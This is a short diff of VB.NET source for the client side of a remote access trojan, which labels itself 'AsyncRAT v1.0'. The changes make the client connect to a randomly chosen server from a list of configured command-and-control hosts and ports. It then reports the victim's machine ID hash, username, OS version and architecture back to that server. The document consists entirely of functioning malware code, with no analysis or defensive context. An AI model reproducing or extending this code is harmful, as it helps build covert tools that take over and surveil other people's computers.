@@ -24,7 +24,7 @@ Public Class ClientSocket
             Threading.Thread.Sleep(2500)
             S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
 
-            Dim ipAddress As IPAddress = IPAddress.Parse(Settings.Host)
+            Dim ipAddress As IPAddress = IPAddress.Parse(Settings.Hosts.Item(New Random().Next(0, Settings.Hosts.Count)))
             Dim ipEndPoint As IPEndPoint = New IPEndPoint(ipAddress, Settings.Ports.Item(New Random().Next(0, Settings.Ports.Count)))
 
             BufferLength = -1
@@ -49,7 +49,7 @@ Public Class ClientSocket
     Private Shared Function Info()
 
         Dim OS As New Devices.ComputerInfo
-        Return String.Concat("INFO", SPL, GetHash(ID), SPL, Environment.UserName, SPL, OS.OSFullName.Replace("Microsoft", Nothing), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit"), SPL, "AsyncClient v0.1")
+        Return String.Concat("INFO", SPL, GetHash(ID), SPL, Environment.UserName, SPL, OS.OSFullName.Replace("Microsoft", Nothing), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit"), SPL, "AsyncRAT v1.0")
 
     End Function
 
